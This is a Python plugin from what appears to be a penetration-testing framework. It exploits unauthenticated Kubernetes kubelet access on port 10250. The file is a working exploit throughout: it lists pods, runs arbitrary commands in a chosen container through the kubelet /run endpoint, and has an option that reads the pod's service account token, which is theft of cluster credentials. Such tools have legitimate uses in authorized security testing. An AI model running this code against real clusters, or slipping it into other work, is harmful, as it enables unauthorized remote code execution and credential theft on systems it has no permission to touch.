import argparse
import json
from copy import copy

import requests
import urllib3
from prettytable import PrettyTable

from plugins.Kubernetes import PluginKubernetesBase
from utils import output
from utils.consts import AllPluginTypes

urllib3.disable_warnings()


# Kubernetes exploit port_unauth -i 192.168.50.55 execute -n kube-system -p calico-node-48psk -c calico-node -e whoami --debug
class PluginK8sPortUnAuthorized(PluginKubernetesBase):
    display = "k8s 10250端口未授权访问"
    alias = "kubelet_unauth"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-i", "--ip", help="target ip address.(192.168.1.1)", required=True, dest="ip")

        e_type = parser.add_subparsers(dest="exploit_type")
        e_type.add_parser("check")

        execute_subCommand = e_type.add_parser("execute")
        execute_subCommand.add_argument("-n", "--name", help="namespace value", required=True, dest="name")
        execute_subCommand.add_argument("-p", "--pod", help="pod name", required=True, dest="pod")
        execute_subCommand.add_argument("-c", "--container", help="container name", required=True, dest="container")
        execute_subCommand.add_argument("-e", "--command", help="execute command(default: whoami)", required=False,
                                        default="whoami", dest="command")
        execute_subCommand.add_argument("--get-token", help="get service accound(/var/run/secrets/kubernetes.io/serviceaccount/token)",
                                        action=argparse.BooleanOptionalAction,default=False,dest="get_token")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        ip = args.ip
        action = args.exploit_type

        output.debug(f"Trying to access https://{ip}:10250/pods")
        r = requests.get(f"https://{ip}:10250/pods/", allow_redirects=False, verify=False)
        if r.status_code == 200:
            output.success(f"Unauthorized access to https://{ip}:10250/pods")
            if action == "check":
                print_pods(ip)
            else:
                execute_command(ip, args.name, args.pod, args.container, args.command, args.get_token)
        else:
            output.info(f"No unauthorized access to https://{ip}:10250/pods")

        return result


def print_pods(ip):
    output.debug(f"Trying to access https://{ip}:10250/runningpods/")
    response = requests.get(f"https://{ip}:10250/runningpods/", allow_redirects=False, verify=False)

    if response.status_code == 200:
        pod_lists = json.loads(response.text)["items"]
        result_table = PrettyTable(["Namespace", "PodName", "ContainerName"])
        for pod in pod_lists:
            container_name = [x["name"] for x in pod["spec"]["containers"]]
            if len(container_name) == 1:
                container_name = container_name[0]
            result_table.add_row([pod["metadata"]["namespace"], pod["metadata"]["name"], container_name])
        output.success(f"\n"
                       f"{result_table}")


def execute_command(ip, namespace, podName, containerName, command, get_token):
    if get_token:
        command = "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    output.debug(f"POST https://{ip}:10250/run/{namespace}/{podName}/{containerName}\n"
                 f"{'':^4}Data: cmd={command}")
    res = requests.post(f"https://{ip}:10250/run/{namespace}/{podName}/{containerName}",
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        data=f"cmd={command}", verify=False)
    output.success(res.text)
